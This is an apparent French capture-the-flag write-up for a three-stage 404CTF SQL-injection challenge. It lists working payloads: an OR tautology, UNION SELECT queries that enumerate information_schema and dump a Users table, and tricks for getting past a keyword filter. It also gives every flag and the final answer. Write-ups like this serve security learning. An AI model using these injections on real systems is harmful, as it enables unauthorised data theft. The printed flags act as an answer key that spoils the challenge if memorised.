**Objectif :** Dans ce challenge, l'objectif est de trouver différents flags successifs à travers des formulaires qui laissent à penser à des injections SQL.
A l'étape 1: l'injection SQL du type OR suggéré par le nom de la page "les vendeurs d'OR" conduit à déceler deux flags dans une même table.

A l'étape 2: l'union select permet d'aller sélectionner une autre table et ses contenus et donc accéder à d'autres données. Il se trouve que des flags y sont cachés.

A l'étape 3: la rencontre sans filtre permet de trouver les données manquantes  des tables puis de déterminer successivement les flags restants

si on saisit : ' or ''=' dans id
car
SELECT from VENDEURS where pseudo='yyy' and id='xxx'

SELECT from VENDEURS where pseudo='FIFI' and id='2'#CORRECTE mais il faut le savoir

si on saisit : ' or ''=' dans id

on a

SELECT from VENDEURS where pseudo='' and id='' or ''=''
ce qui nous donne tout
On a 2 flags
***
On parle d'union : union select de base en SQL
on essaie de voir le noms es tabmes
' UNION SELECT * FROM information_schema.tables or ''='
echec

Si on reproduit le OR de l'étape 1 on a une SQL injection qui marche mais pas de flag

1' union select 1, table_name from information_schema.tables order by 'table_name

1' UNION SELECT table_name, column_name FROM information_schema.columns where table_name='Users

avec cette requete :
1' UNION SELECT nom, prenom FROM Users where nom<>'
note le <> qui indique tous les user qui n'ont PAS le nom precisé
ETAPE 3 : rencontre sans FILTRE
si on refait le meme coup que l'etape 1 avec
'or''='
on  a 2 FLAGs de + !

si on remplace espâces par TAB ca marche mais le SELECT estun mot clé interdit

La ruse est de changer une lettre de select y par AUTRE chose, come le code HEXA du S
J'ai d'abord testé plein de cas
SEL\nECT (retour ligne)
SEL / ECT (SQL BREAK)
SEL/**/ECT commentaire
SeLeCt (casse)
concat('SEL', 'ECT")
et ca marche avec ça.

Les différents morceaux de flag sont sous la forme : 404CTF{Nom},404CTF{Prénom},404CTF{Adresse},404CTF{Date},404CTF{Heure},404CTF{Téléphone},404CTF{Mdp}
On a tous les flags cherchés :
on a tout 
password = 404CTF{GorfousAuPouvoir}
Date = 404CTF{2022-07-14} 
Heure = 404CTF{01hDuMatin}
Nom = 404CTF{Vereux}
Prenom = 404CTF{UnGorfou}
Telephone = 404CTF{0145769456}
Adresse = 404CTF{21 rue des kiwis}
Il n'y a plus qu'a encaisser les points

Le flag final est la concaténation de tous les morceaux sans espace : 404CTF{NomPrénomTéléphoneAdresseDateHeureMdp}

Le flag global est donc 404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}

Voir la solution.
